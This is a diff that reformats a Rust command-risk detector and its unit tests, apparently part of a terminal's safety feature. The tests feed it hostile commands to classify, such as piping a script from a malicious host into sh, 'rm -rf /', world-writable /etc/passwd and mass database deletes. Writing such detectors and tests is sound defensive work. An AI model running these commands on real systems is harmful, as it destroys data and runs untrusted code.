@@ -150,11 +150,16 @@ struct DetectionRecord {
 #[allow(dead_code)]
 impl RateLimitTracker {
     fn new() -> Self {
-        Self { detections: Vec::new() }
+        Self {
+            detections: Vec::new(),
+        }
     }
 
     fn record_detection(&mut self, risk_level: RiskLevel, category: &str, command: &str) {
-        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
+        let timestamp = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs();
 
         let command_hash = self.hash_command(command);
 
@@ -171,10 +176,14 @@ impl RateLimitTracker {
             return false;
         }
 
-        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs();
 
         // Clean up old records
-        self.detections.retain(|record| now - record.timestamp < config.window_seconds);
+        self.detections
+            .retain(|record| now - record.timestamp < config.window_seconds);
 
         // Check if we've exceeded the limit
         self.detections.len() >= config.max_detections as usize
@@ -810,7 +819,7 @@ impl SecurityLens {
                         RiskLevel::Caution,
                     ),
                 ]);
-            },
+            }
             Platform::MacOS => {
                 patterns.extend(vec![
                     // System Integrity Protection disable
@@ -845,7 +854,7 @@ impl SecurityLens {
                         RiskLevel::Warning,
                     ),
                 ]);
-            },
+            }
             Platform::Windows => {
                 patterns.extend(vec![
                     // PowerShell execution policy
@@ -879,8 +888,8 @@ impl SecurityLens {
                         RiskLevel::Warning,
                     ),
                 ]);
-            },
-            Platform::Unknown => {},
+            }
+            Platform::Unknown => {}
         }
 
         patterns
@@ -901,7 +910,10 @@ impl SecurityLens {
         }
 
         // Check rate limiting first
-        if self.rate_limit_tracker.is_rate_limited(&self.policy.rate_limit) {
+        if self
+            .rate_limit_tracker
+            .is_rate_limited(&self.policy.rate_limit)
+        {
             warn!("Security Lens rate limit exceeded for command analysis");
             return CommandRisk {
                 level: RiskLevel::Warning,
@@ -932,7 +944,8 @@ impl SecurityLens {
                     highest_risk = *risk_level;
                 }
                 // Record detection for rate limiting
-                self.rate_limit_tracker.record_detection(*risk_level, &factor.category, command);
+                self.rate_limit_tracker
+                    .record_detection(*risk_level, &factor.category, command);
             }
         }
 
@@ -945,7 +958,8 @@ impl SecurityLens {
                     highest_risk = *risk_level;
                 }
                 // Record detection for rate limiting
-                self.rate_limit_tracker.record_detection(*risk_level, &factor.category, command);
+                self.rate_limit_tracker
+                    .record_detection(*risk_level, &factor.category, command);
             }
         }
 
@@ -1010,8 +1024,11 @@ impl SecurityLens {
         let explanation = self.generate_explanation(&risk_factors, &highest_risk);
         let mitigations = self.generate_mitigations(&risk_factors);
         let mitigation_links = self.generate_mitigation_links(&risk_factors);
-        let requires_confirmation =
-            *self.policy.require_confirmation.get(&highest_risk).unwrap_or(&false);
+        let requires_confirmation = *self
+            .policy
+            .require_confirmation
+            .get(&highest_risk)
+            .unwrap_or(&false);
 
         // Log detection if significant
         if highest_risk != RiskLevel::Safe {
@@ -1025,7 +1042,11 @@ impl SecurityLens {
                 "Command analyzed: '{}' -> {:?} (factors: {})",
                 command.chars().take(50).collect::<String>(),
                 highest_risk,
-                risk_factors.iter().map(|f| f.category.as_str()).collect::<Vec<&str>>().join(", ")
+                risk_factors
+                    .iter()
+                    .map(|f| f.category.as_str())
+                    .collect::<Vec<&str>>()
+                    .join(", ")
             );
         }
 
@@ -1078,222 +1099,222 @@ impl SecurityLens {
                     mitigations.push("Use targeted paths instead of root directory".to_string());
                     mitigations.push("Consider using --dry-run or --simulate first".to_string());
                     mitigations.push("Ensure you have system backups".to_string());
-                },
+                }
                 "fork_bomb" => {
                     mitigations.push("Do not execute fork bomb patterns".to_string());
                     mitigations.push("Use ulimit to set process limits before testing".to_string());
-                },
+                }
 
                 // Filesystem operations
                 "filesystem_mass_delete" => {
                     mitigations.push("Use specific file patterns instead of wildcards".to_string());
                     mitigations.push("Test deletion in a safe directory first".to_string());
-                },
+                }
                 "filesystem_recursive" => {
                     mitigations.push("Verify the target path is correct".to_string());
                     mitigations.push("Consider using -i for interactive confirmation".to_string());
-                },
+                }
                 "filesystem_permissions" => {
                     mitigations
                         .push("Use more restrictive permissions (e.g., 755 or 644)".to_string());
                     mitigations.push("Consider if write access is actually needed".to_string());
-                },
+                }
                 "filesystem_system_ownership" => {
                     mitigations.push("Verify ownership change is necessary".to_string());
                     mitigations.push("Use sudo for temporary elevated access instead".to_string());
-                },
+                }
                 "filesystem_mount_risky" => {
                     mitigations.push("Review mount options for security implications".to_string());
                     mitigations.push("Use read-only mounts where possible".to_string());
-                },
+                }
 
                 // Networking operations
                 "network_remote_execution" | "network_remote_script" => {
                     mitigations.push("Review the script content before execution".to_string());
                     mitigations.push("Download to file first, inspect, then execute".to_string());
                     mitigations.push("Verify the source is trusted".to_string());
-                },
+                }
                 "network_executable_download" => {
                     mitigations.push("Download to /tmp first and verify binary".to_string());
                     mitigations.push("Check binary signatures if available".to_string());
-                },
+                }
                 "network_reverse_shell" => {
                     mitigations.push("Ensure this is authorized penetration testing".to_string());
                     mitigations.push("Use encrypted connections for sensitive data".to_string());
-                },
+                }
                 "network_firewall_disable" => {
                     mitigations
                         .push("Document firewall changes and plan re-enablement".to_string());
                     mitigations
                         .push("Consider temporary rules instead of complete disable".to_string());
-                },
+                }
                 "network_scanning" => {
                     mitigations
                         .push("Ensure you have permission to scan target networks".to_string());
                     mitigations.push("Use less aggressive scan options".to_string());
-                },
+                }
 
                 // Package manager operations
                 "package_global_install" => {
                     mitigations.push("Use virtual environments or user-local installs".to_string());
                     mitigations.push("Review package dependencies before installing".to_string());
-                },
+                }
 
                 // Warp-specific mitigations
                 "terminal_session_kill" => {
                     mitigations.push("Save your work before killing sessions".to_string());
                     mitigations.push("Consider detaching rather than killing".to_string());
-                },
+                }
                 "history_manipulation" => {
                     mitigations.push("Consider if history clearing is necessary".to_string());
                     mitigations
                         .push("Use private shell sessions for sensitive commands".to_string());
-                },
+                }
                 "ai_prompt_injection" => {
                     mitigations
                         .push("Review command for potential AI prompt manipulation".to_string());
                     mitigations.push("Avoid executing untrusted AI-generated commands".to_string());
-                },
+                }
                 "terminal_escape_sequences" => {
                     mitigations.push("Verify escape sequences are intended".to_string());
                     mitigations.push("Test in safe environment first".to_string());
-                },
+                }
                 "process_monitoring" => {
                     mitigations.push("Ensure you have permission to monitor processes".to_string());
                     mitigations.push("Be aware this may expose sensitive information".to_string());
-                },
+                }
                 "memory_dumping" => {
                     mitigations.push("Ensure this is authorized security analysis".to_string());
                     mitigations.push("Handle memory dumps securely".to_string());
-                },
+                }
                 "package_untrusted_source" => {
                     mitigations.push("Verify package sources and signatures".to_string());
                     mitigations.push("Use official package repositories when possible".to_string());
-                },
+                }
                 "package_auto_remove" => {
                     mitigations.push("Review packages to be removed first".to_string());
                     mitigations.push("Use --dry-run to preview changes".to_string());
-                },
+                }
                 "package_direct_url" => {
                     mitigations.push("Verify the URL and package authenticity".to_string());
                     mitigations.push("Check package signatures if available".to_string());
-                },
+                }
 
                 // Kubernetes and container operations
                 "kubernetes_change" => {
                     mitigations.push("Review YAML manifests for configuration changes".to_string());
                     mitigations.push("Test in development environment first".to_string());
-                },
+                }
                 "kubernetes_prod_delete" | "kubernetes_helm_delete" => {
                     mitigations.push("Verify you're targeting the correct resource".to_string());
                     mitigations.push("Ensure backups and rollback plans are in place".to_string());
                     mitigations.push("Consider using --dry-run first".to_string());
-                },
+                }
                 "container_privileged" => {
                     mitigations
                         .push("Use specific capabilities instead of --privileged".to_string());
                     mitigations.push("Run containers as non-root user when possible".to_string());
-                },
+                }
                 "container_cleanup" => {
                     mitigations.push("Review what will be deleted with --volumes flag".to_string());
                     mitigations.push("Consider cleaning specific resources instead".to_string());
-                },
+                }
 
                 // Cloud operations
                 "cloud_aws_deletion" | "cloud_gcp_deletion" | "cloud_azure_rg_delete" => {
                     mitigations.push("Double-check resource identifiers".to_string());
                     mitigations.push("Ensure you have backups".to_string());
                     mitigations.push("Consider using resource tagging for protection".to_string());
-                },
+                }
                 "cloud_s3_force_delete" => {
                     mitigations.push("Verify bucket contents are backed up elsewhere".to_string());
                     mitigations
                         .push("Use versioning and MFA delete for critical buckets".to_string());
-                },
+                }
 
                 // Infrastructure as Code
                 "iac_terraform_destroy" | "iac_pulumi_destroy" => {
                     mitigations.push("Review infrastructure plan before destruction".to_string());
                     mitigations.push("Export state backup before proceeding".to_string());
                     mitigations.push("Consider selective resource targeting".to_string());
-                },
+                }
                 "iac_terraform_unlock" => {
                     mitigations.push("Verify no other operations are in progress".to_string());
                     mitigations.push("Coordinate with team before force unlocking".to_string());
-                },
+                }
 
                 // Database operations
                 "database_deletion" | "database_data_wipe" => {
                     mitigations.push("Create a backup before deletion".to_string());
                     mitigations.push("Verify you're connected to the correct database".to_string());
                     mitigations.push("Test in development environment first".to_string());
-                },
+                }
                 "database_user_mgmt" => {
                     mitigations.push("Review user privileges being granted/revoked".to_string());
                     mitigations.push("Follow principle of least privilege".to_string());
-                },
+                }
 
                 // Process and script execution
                 "script_dynamic_execution" => {
                     mitigations.push("Validate and sanitize input before eval/exec".to_string());
                     mitigations.push("Use safer alternatives like ast.literal_eval".to_string());
-                },
+                }
                 "process_injection" => {
                     mitigations.push("Ensure this is authorized debugging/testing".to_string());
                     mitigations.push("Run in isolated environment".to_string());
-                },
+                }
 
                 // Version control
                 "vcs_destructive" => {
                     mitigations.push("Use git stash to save uncommitted changes".to_string());
                     mitigations
                         .push("Verify you want to discard all local modifications".to_string());
-                },
+                }
                 "vcs_removal" => {
                     mitigations.push("Backup .git directory before deletion".to_string());
                     mitigations
                         .push("Consider if you really need to remove version control".to_string());
-                },
+                }
                 "vcs_force_push" => {
                     mitigations.push("Coordinate with team before force pushing".to_string());
                     mitigations.push("Use --force-with-lease for safer force pushes".to_string());
-                },
+                }
 
                 // System services
                 "service_control" => {
                     mitigations.push("Verify service can be safely stopped".to_string());
                     mitigations.push("Consider using restart instead of stop".to_string());
-                },
+                }
                 "service_critical_stop" => {
                     mitigations
                         .push("Critical services may affect system connectivity".to_string());
                     mitigations
                         .push("Ensure alternative access methods before stopping".to_string());
-                },
+                }
 
                 // Cryptography
                 "crypto_weak_keys" => {
                     mitigations.push("Use strong key lengths (RSA 2048+, Ed25519)".to_string());
                     mitigations.push("Set proper passphrases for private keys".to_string());
-                },
+                }
 
                 // Shell environment
                 "shell_history_clear" => {
                     mitigations.push("Consider selective history editing instead".to_string());
                     mitigations.push("Backup history before clearing if needed".to_string());
-                },
+                }
                 "env_sensitive_export" => {
                     mitigations.push("Use temporary export or read from secure file".to_string());
                     mitigations.push("Consider using secret management tools".to_string());
-                },
+                }
 
                 // General catch-all
                 "sensitive_data" => {
                     mitigations
                         .push("Avoid exposing sensitive data in command history".to_string());
                     mitigations.push("Use environment variables or secure vaults".to_string());
-                },
-                _ => {},
+                }
+                _ => {}
             }
         }
 
@@ -1321,7 +1342,7 @@ impl SecurityLens {
                         url: format!("{}/system-safety", base_url),
                         description: "Critical system operation safety practices".to_string(),
                     });
-                },
+                }
                 "filesystem_mass_delete"
                 | "filesystem_recursive"
                 | "filesystem_permissions"
@@ -1332,7 +1353,7 @@ impl SecurityLens {
                         url: format!("{}/safe-file-operations", base_url),
                         description: "Learn about safe filesystem management".to_string(),
                     });
-                },
+                }
 
                 // Networking operations
                 "network_remote_execution"
@@ -1343,7 +1364,7 @@ impl SecurityLens {
                         url: format!("{}/remote-scripts", base_url),
                         description: "Best practices for executing remote scripts".to_string(),
                     });
-                },
+                }
                 "network_reverse_shell" | "network_firewall_disable" | "network_scanning" => {
                     links.push(MitigationLink {
                         title: "Network Security Guide".to_string(),
@@ -1351,7 +1372,7 @@ impl SecurityLens {
                         description: "Network security and penetration testing guidelines"
                             .to_string(),
                     });
-                },
+                }
 
                 // Package manager operations
                 "package_global_install"
@@ -1364,7 +1385,7 @@ impl SecurityLens {
                         description: "Safe package installation and management practices"
                             .to_string(),
                     });
-                },
+                }
 
                 // Container and Kubernetes
                 "kubernetes_change" | "kubernetes_prod_delete" | "kubernetes_helm_delete" => {
@@ -1373,14 +1394,14 @@ impl SecurityLens {
                         url: format!("{}/kubernetes-security", base_url),
                         description: "Safe Kubernetes cluster management practices".to_string(),
                     });
-                },
+                }
                 "container_privileged" | "container_cleanup" => {
                     links.push(MitigationLink {
                         title: "Container Security Best Practices".to_string(),
                         url: format!("{}/container-security", base_url),
                         description: "Docker and container security guidelines".to_string(),
                     });
-                },
+                }
 
                 // Cloud provider operations
                 "cloud_aws_deletion" | "cloud_s3_force_delete" => {
@@ -1389,21 +1410,21 @@ impl SecurityLens {
                         url: format!("{}/aws-security", base_url),
                         description: "Safe AWS resource management guidelines".to_string(),
                     });
-                },
+                }
                 "cloud_gcp_deletion" => {
                     links.push(MitigationLink {
                         title: "GCP Security Best Practices".to_string(),
                         url: format!("{}/gcp-security", base_url),
                         description: "Safe Google Cloud resource management".to_string(),
                     });
-                },
+                }
                 "cloud_azure_rg_delete" => {
                     links.push(MitigationLink {
                         title: "Azure Security Best Practices".to_string(),
                         url: format!("{}/azure-security", base_url),
                         description: "Safe Azure resource management guidelines".to_string(),
                     });
-                },
+                }
 
                 // Infrastructure as Code
                 "iac_terraform_destroy" | "iac_terraform_unlock" | "iac_pulumi_destroy" => {
@@ -1412,7 +1433,7 @@ impl SecurityLens {
                         url: format!("{}/iac-security", base_url),
                         description: "Safe infrastructure automation practices".to_string(),
                     });
-                },
+                }
 
                 // Database operations
                 "database_deletion" | "database_data_wipe" | "database_user_mgmt" => {
@@ -1421,7 +1442,7 @@ impl SecurityLens {
                         url: format!("{}/database-safety", base_url),
                         description: "Database backup and recovery strategies".to_string(),
                     });
-                },
+                }
 
                 // Process and script security
                 "script_dynamic_execution" | "process_injection" => {
@@ -1430,7 +1451,7 @@ impl SecurityLens {
                         url: format!("{}/script-security", base_url),
                         description: "Secure coding and process debugging practices".to_string(),
                     });
-                },
+                }
 
                 // Version control
                 "vcs_destructive" | "vcs_removal" | "vcs_force_push" => {
@@ -1439,7 +1460,7 @@ impl SecurityLens {
                         url: format!("{}/vcs-safety", base_url),
                         description: "Safe Git and version control practices".to_string(),
                     });
-                },
+                }
 
                 // System services
                 "service_control" | "service_critical_stop" => {
@@ -1448,7 +1469,7 @@ impl SecurityLens {
                         url: format!("{}/service-management", base_url),
                         description: "Safe system service administration".to_string(),
                     });
-                },
+                }
 
                 // Cryptography
                 "crypto_weak_keys" => {
@@ -1457,7 +1478,7 @@ impl SecurityLens {
                         url: format!("{}/crypto-security", base_url),
                         description: "Secure key generation and management".to_string(),
                     });
-                },
+                }
 
                 // Shell environment
                 "shell_history_clear" | "env_sensitive_export" => {
@@ -1466,7 +1487,7 @@ impl SecurityLens {
                         url: format!("{}/shell-security", base_url),
                         description: "Secure shell configuration and usage".to_string(),
                     });
-                },
+                }
 
                 // Sensitive data
                 "sensitive_data" => {
@@ -1475,7 +1496,7 @@ impl SecurityLens {
                         url: format!("{}/secrets-management", base_url),
                         description: "How to handle secrets securely".to_string(),
                     });
-                },
+                }
 
                 // Platform-specific (Linux)
                 "systemd_mask" | "firewall_flush" | "kernel_module" => {
@@ -1484,7 +1505,7 @@ impl SecurityLens {
                         url: format!("{}/linux-admin", base_url),
                         description: "Safe Linux system administration practices".to_string(),
                     });
-                },
+                }
 
                 // Platform-specific (macOS)
                 "sip_disable" | "gatekeeper_disable" | "keychain_delete" => {
@@ -1493,7 +1514,7 @@ impl SecurityLens {
                         url: format!("{}/macos-security", base_url),
                         description: "Understanding macOS security mechanisms".to_string(),
                     });
-                },
+                }
 
                 // Platform-specific (Windows)
                 "execution_policy" | "defender_disable" | "registry_hklm" => {
@@ -1502,9 +1523,9 @@ impl SecurityLens {
                         url: format!("{}/windows-security", base_url),
                         description: "Windows security best practices".to_string(),
                     });
-                },
+                }
 
-                _ => {},
+                _ => {}
             }
         }
 
@@ -1519,7 +1540,10 @@ impl SecurityLens {
         use std::collections::hash_map::DefaultHasher;
         use std::hash::{Hash, Hasher};
 
-        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
+        let timestamp = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_nanos();
 
         let mut hasher = DefaultHasher::new();
         timestamp.hash(&mut hasher);
@@ -1554,8 +1578,11 @@ impl SecurityLens {
 
         // Only return risk if it's above Safe and requires confirmation
         if highest_risk != RiskLevel::Safe {
-            let requires_confirmation =
-                *self.policy.require_confirmation.get(&highest_risk).unwrap_or(&false);
+            let requires_confirmation = *self
+                .policy
+                .require_confirmation
+                .get(&highest_risk)
+                .unwrap_or(&false);
 
             if requires_confirmation {
                 let mitigations = self.generate_mitigations(&all_factors);
@@ -1670,7 +1697,7 @@ impl SecurityLens {
                         pattern: "Invoke-Expression".to_string(),
                     });
                 }
-            },
+            }
             ShellKind::Fish => {
                 if command.contains("eval") {
                     additional_factors.push(RiskFactor {
@@ -1680,8 +1707,8 @@ impl SecurityLens {
                         pattern: "fish eval".to_string(),
                     });
                 }
-            },
-            _ => {},
+            }
+            _ => {}
         }
 
         // Root directory operations are always high risk
@@ -1752,7 +1779,11 @@ impl Default for SecurityPolicy {
             platform_groups: vec![],
             gate_paste_events: true,
             docs_base_url: String::new(),
-            rate_limit: RateLimitConfig { max_detections: 5, window_seconds: 60, enabled: true },
+            rate_limit: RateLimitConfig {
+                max_detections: 5,
+                window_seconds: 60,
+                enabled: true,
+            },
         }
     }
 }
@@ -1876,7 +1907,10 @@ mod tests {
         assert!(risk.factors.iter().any(|f| f.category == "custom"));
 
         // Disabled policy should always return Safe
-        let disabled = SecurityPolicy { enabled: false, ..SecurityPolicy::default() };
+        let disabled = SecurityPolicy {
+            enabled: false,
+            ..SecurityPolicy::default()
+        };
         let mut lens_disabled = SecurityLens::new(disabled);
         let risk = lens_disabled.analyze_command("rm -rf /");
         assert_eq!(risk.level, RiskLevel::Safe);
@@ -1923,7 +1957,10 @@ mod tests {
 
     #[test]
     fn test_paste_content_analysis() {
-        let policy = SecurityPolicy { gate_paste_events: true, ..SecurityPolicy::default() };
+        let policy = SecurityPolicy {
+            gate_paste_events: true,
+            ..SecurityPolicy::default()
+        };
         let mut lens = SecurityLens::new(policy);
 
         // Test safe paste content
@@ -1949,19 +1986,29 @@ mod tests {
         assert!(!risk.mitigation_links.is_empty());
 
         // Check that we have the expected risk factors
-        assert!(risk.factors.iter().any(|f| f.category == "system_destruction"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "system_destruction"));
 
         // Check that we have mitigation links that correspond to the detected categories
-        let has_system_safety =
-            risk.mitigation_links.iter().any(|l| l.url.contains("system-safety"));
-        let has_file_operations =
-            risk.mitigation_links.iter().any(|l| l.url.contains("safe-file-operations"));
+        let has_system_safety = risk
+            .mitigation_links
+            .iter()
+            .any(|l| l.url.contains("system-safety"));
+        let has_file_operations = risk
+            .mitigation_links
+            .iter()
+            .any(|l| l.url.contains("safe-file-operations"));
 
         // Should have at least one of these links since both categories are detected
         assert!(
             has_system_safety || has_file_operations,
             "Expected either system-safety or safe-file-operations link, got: {:?}",
-            risk.mitigation_links.iter().map(|l| &l.url).collect::<Vec<_>>()
+            risk.mitigation_links
+                .iter()
+                .map(|l| &l.url)
+                .collect::<Vec<_>>()
         );
 
         // Verify link structure
@@ -1978,17 +2025,26 @@ mod tests {
         // Mass deletion
         let risk = lens.analyze_command("rm -rf /var/*");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "filesystem_mass_delete"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "filesystem_mass_delete"));
 
         // Permission exposure
         let risk = lens.analyze_command("chmod 777 /etc/passwd");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "filesystem_permissions"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "filesystem_permissions"));
 
         // System ownership change
         let risk = lens.analyze_command("chown user:group /usr/bin");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk.factors.iter().any(|f| f.category == "filesystem_system_ownership"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "filesystem_system_ownership"));
     }
 
     #[test]
@@ -1998,12 +2054,18 @@ mod tests {
         // Remote execution
         let risk = lens.analyze_command("curl https://malicious.com/script.sh | sh");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "network_remote_execution"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "network_remote_execution"));
 
         // Executable download to PATH
         let risk = lens.analyze_command("wget https://example.com/binary -o /usr/local/bin/tool");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk.factors.iter().any(|f| f.category == "network_executable_download"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "network_executable_download"));
 
         // Network scanning
         let risk = lens.analyze_command("nmap -sS 10.0.0.0/8");
@@ -2013,12 +2075,18 @@ mod tests {
             risk.factors.iter().map(|f| &f.category).collect::<Vec<_>>()
         );
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk.factors.iter().any(|f| f.category == "network_scanning"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "network_scanning"));
 
         // Firewall disable
         let risk = lens.analyze_command("ufw disable");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "network_firewall_disable"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "network_firewall_disable"));
     }
 
     #[test]
@@ -2028,23 +2096,35 @@ mod tests {
         // Global install
         let risk = lens.analyze_command("npm install -g dangerous-package");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk.factors.iter().any(|f| f.category == "package_global_install"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "package_global_install"));
 
         // Untrusted source
         let risk = lens.analyze_command("pip install --trusted-host untrusted.com package");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "package_untrusted_source"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "package_untrusted_source"));
 
         // Auto removal
         let risk = lens.analyze_command("apt-get autoremove -y");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "package_auto_remove"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "package_auto_remove"));
 
         // Direct URL install
         let risk =
             lens.analyze_command("pip install https://github.com/user/repo/archive/main.zip");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk.factors.iter().any(|f| f.category == "package_direct_url"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "package_direct_url"));
     }
 
     #[test]
@@ -2054,17 +2134,26 @@ mod tests {
         // AWS S3 force delete
         let risk = lens.analyze_command("aws s3 rb s3://important-bucket --force");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk.factors.iter().any(|f| f.category == "cloud_s3_force_delete"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "cloud_s3_force_delete"));
 
         // GCP deletion
         let risk = lens.analyze_command("gcloud compute instances delete prod-instance --quiet");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "cloud_gcp_deletion"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "cloud_gcp_deletion"));
 
         // Azure resource group deletion
         let risk = lens.analyze_command("az group delete --name prod-rg --yes");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "cloud_azure_rg_delete"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "cloud_azure_rg_delete"));
     }
 
     #[test]
@@ -2074,17 +2163,26 @@ mod tests {
         // Production deletion
         let risk = lens.analyze_command("kubectl delete deployment app -n production");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk.factors.iter().any(|f| f.category == "kubernetes_prod_delete"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "kubernetes_prod_delete"));
 
         // General k8s changes
         let risk = lens.analyze_command("kubectl apply -f deployment.yaml");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "kubernetes_change"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "kubernetes_change"));
 
         // Helm production delete
         let risk = lens.analyze_command("helm delete myapp -n production");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "kubernetes_helm_delete"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "kubernetes_helm_delete"));
     }
 
     #[test]
@@ -2094,17 +2192,26 @@ mod tests {
         // Data wipe
         let risk = lens.analyze_command("DELETE FROM users WHERE 1=1");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk.factors.iter().any(|f| f.category == "database_data_wipe"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "database_data_wipe"));
 
         // User management
         let risk = lens.analyze_command("GRANT ALL PRIVILEGES ON * TO user");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "database_user_mgmt"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "database_user_mgmt"));
 
         // Database deletion
         let risk = lens.analyze_command("DROP DATABASE important_db");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "database_deletion"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "database_deletion"));
     }
 
     #[test]
@@ -2114,12 +2221,18 @@ mod tests {
         // Privileged container
         let risk = lens.analyze_command("docker run --privileged -it ubuntu");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "container_privileged"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "container_privileged"));
 
         // System cleanup
         let risk = lens.analyze_command("docker system prune -a");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "container_cleanup"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "container_cleanup"));
     }
 
     #[test]
@@ -2129,17 +2242,26 @@ mod tests {
         // Terraform destroy
         let risk = lens.analyze_command("terraform destroy");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "iac_terraform_destroy"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "iac_terraform_destroy"));
 
         // Force unlock
         let risk = lens.analyze_command("terraform force-unlock abc123");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "iac_terraform_unlock"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "iac_terraform_unlock"));
 
         // Pulumi destroy
         let risk = lens.analyze_command("pulumi destroy --yes");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "iac_pulumi_destroy"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "iac_pulumi_destroy"));
     }
 
     #[test]
@@ -2164,7 +2286,10 @@ mod tests {
         // Critical service stop
         let risk = lens.analyze_command("systemctl stop ssh");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk.factors.iter().any(|f| f.category == "service_critical_stop"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "service_critical_stop"));
 
         // General service control
         let risk = lens.analyze_command("systemctl disable apache2");
@@ -2179,17 +2304,26 @@ mod tests {
         // Weak crypto generation
         let risk = lens.analyze_command("ssh-keygen -N '' -f ~/.ssh/weak_key");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "crypto_weak_keys"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "crypto_weak_keys"));
 
         // History manipulation
         let risk = lens.analyze_command("history -c");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk.factors.iter().any(|f| f.category == "shell_history_clear"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "shell_history_clear"));
 
         // Sensitive environment export
         let risk = lens.analyze_command("export PASSWORD=secret123");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk.factors.iter().any(|f| f.category == "env_sensitive_export"));
+        assert!(risk
+            .factors
+            .iter()
+            .any(|f| f.category == "env_sensitive_export"));
     }
 
     #[test]
@@ -2201,8 +2335,10 @@ mod tests {
             message: "Using production danger tool".to_string(),
         };
 
-        let policy =
-            SecurityPolicy { custom_patterns: vec![custom_pattern], ..SecurityPolicy::default() };
+        let policy = SecurityPolicy {
+            custom_patterns: vec![custom_pattern],
+            ..SecurityPolicy::default()
+        };
 
         let mut lens = SecurityLens::new(policy);
         let risk = lens.analyze_command("danger-tool --prod");
@@ -2212,10 +2348,16 @@ mod tests {
 
     #[test]
     fn test_rate_limiting_functionality() {
-        let rate_limit_config =
-            RateLimitConfig { max_detections: 2, window_seconds: 60, enabled: true };
+        let rate_limit_config = RateLimitConfig {
+            max_detections: 2,
+            window_seconds: 60,
+            enabled: true,
+        };
 
-        let policy = SecurityPolicy { rate_limit: rate_limit_config, ..SecurityPolicy::default() };
+        let policy = SecurityPolicy {
+            rate_limit: rate_limit_config,
+            ..SecurityPolicy::default()
+        };
 
         let mut lens = SecurityLens::new(policy);
 
